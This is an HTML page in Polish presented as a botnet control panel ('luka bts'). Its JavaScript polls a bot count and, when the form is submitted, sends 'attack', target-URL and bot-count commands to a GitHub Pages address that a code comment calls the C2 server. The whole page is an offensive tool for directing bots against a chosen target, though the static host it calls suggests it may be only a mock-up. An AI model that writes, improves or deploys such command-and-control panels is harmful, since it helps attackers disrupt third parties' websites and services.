<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Panel sterujący botnetem - luka bts</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            color: #0f0;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
        }

        h1 {
            font-size: 48px;
            margin-bottom: 20px;
        }

        p {
            font-size: 20px;
            margin-bottom: 30px;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
            width: 100%;
            max-width: 450px;
        }

        input, button {
            padding: 10px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            background-color: #000;
            color: #0f0;
        }

        input {
            background-color: #111;
        }

        button {
            background-color: #00ff00;
            cursor: pointer;
        }

        button:hover {
            background-color: #00cc00;
        }

        #botCount {
            font-size: 24px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <h1>Panel sterujący botnetem - luka bts</h1>
    <div id="botCount">Liczba aktywnych botów: <span id="botCountValue">0</span></div>
    <p>Wyślij komendę do botów</p>

    <form id="attackForm">
        <label for="target">Cel ataku:</label>
        <input type="text" id="target" name="target" value="https://atakujesz.com" placeholder="np. https://atakujesz.com" required>

        <label for="botCount">Liczba botów:</label>
        <input type="number" id="botCount" name="botCount" value="10" min="1" required>

        <button type="submit">Uruchom atak</button>
    </form>

    <script>
        // Pobierz liczbę aktywnych botów
        function getBotCount() {
            fetch('https://zulekzulowski9-jpg.github.io/lukabots/no_think/botcount')
                .then(response => response.json())
                .then(data => {
                    document.getElementById("botCountValue").textContent = data.count;
                })
                .catch(error => {
                    console.error('Błąd podczas pobierania liczby botów:', error);
                });
        }

        // Aktualizuj licznik co 5 sekund
        setInterval(getBotCount, 5000);
        getBotCount(); // Pobierz raz na początku

        document.getElementById("attackForm").addEventListener("submit", function (e) {
            e.preventDefault();

            const target = document.getElementById("target").value;
            const botCount = document.getElementById("botCount").value;

            // Wysyłanie komend do serwera C2
            fetch('https://zulekzulowski9-jpg.github.io/lukabots/no_think/attack')
                .then(() => fetch(`https://zulekzulowski9-jpg.github.io/lukabots/no_think/target?${target}`))
                .then(() => fetch(`https://zulekzulowski9-jpg.github.io/lukabots/no_think/itr?${botCount}`))
                .then(() => {
                    alert("Atak zaczął się!");
                })
                .catch(error => {
                    console.error('Błąd podczas wysyłania komend:', error);
                    alert("Błąd podczas wysyłania komend. Sprawdź adres serwera.");
                });
        });
    </script>
</body>
</html>
